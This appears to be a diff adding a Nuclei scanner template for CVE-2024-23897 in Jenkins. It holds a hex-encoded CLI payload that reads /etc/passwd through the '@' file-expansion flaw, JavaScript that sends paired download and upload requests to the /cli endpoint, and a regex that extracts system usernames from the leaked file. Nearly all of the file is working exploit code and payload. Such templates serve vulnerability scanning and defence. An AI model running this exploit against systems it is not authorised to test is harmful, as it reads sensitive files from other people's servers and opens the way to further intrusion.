@@ -1,0 +1,56 @@
+id: CVE-2024-23897
+
+info:
+  name: Jenkins < 2.441 - Arbitrary File Read
+  author: iamnoooob,rootxharsh,pdresearch
+  severity: high
+  description: |
+    Jenkins 2.441 and earlier, LTS 2.426.2 and earlier does not disable a feature of its CLI command parser that replaces an '@' character followed by a file path in an argument with the file's contents, allowing unauthenticated attackers to read arbitrary files on the Jenkins controller file system.
+  reference:
+    - https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314
+    - https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins/
+    - https://github.com/Mr-xn/Penetration_Testing_POC
+    - https://github.com/forsaken0127/CVE-2024-23897
+    - https://github.com/nomi-sec/PoC-in-GitHub
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cve-id: CVE-2024-23897
+    epss-score: 0.41536
+    epss-percentile: 0.97188
+    cpe: cpe:2.3:a:jenkins:jenkins:*:*:*:*:lts:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: jenkins
+    product: jenkins
+    shodan-query: "product:\"Jenkins\""
+  tags: cve,cve2024,lfi,rce,jenkins
+variables:
+  payload: "{{hex_decode('0000000e00000c636f6e6e6563742d6e6f64650000000e00000c402f6574632f706173737764000000070200055554462d3800000007010005656e5f41450000000003')}}"
+
+javascript:
+  - code: |
+      let m = require('nuclei/net');
+      let name=(Host.includes(':') ? Host : Host+":80");
+      let conn,conn2;
+      try { conn = m.OpenTLS('tcp', name) } catch { conn=  m.Open('tcp', name)}
+      conn.Send('POST /cli?remoting=false HTTP/1.1\r\nHost:'+Host+'\r\nSession: 39382176-ac9c-4a00-bbc6-4172b3cf1e92\r\nSide: download\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n');
+      try { conn2 = m.OpenTLS('tcp', name) } catch { conn2=  m.Open('tcp', name)}
+      conn2.Send('POST /cli?remoting=false HTTP/1.1\r\nHost:'+Host+'\r\nContent-type: application/octet-stream\r\nSession: 39382176-ac9c-4a00-bbc6-4172b3cf1e92\r\nSide: upload\r\nConnection: keep-alive\r\nContent-Length: 163\r\n\r\n'+Body)
+      resp = conn.RecvString(1000)
+    args:
+      Body: "{{payload}}"
+      Host: "{{Hostname}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(response, "No such agent \"")'
+
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - '\b([a-z_][a-z0-9_-]{0,31})\:x\:'
+# digest: 4b0a00483046022100a22e0bf486c5362bd7b22a4d814691dcb9318a631e13e7cf7086dd922feb4dd4022100cfacc9f72ee0cf45347e0c8c97dc2b5c6f95028b6f5cc3a68a506f4d3d4c7964:922c64590222798bb761d5b6d8e72950
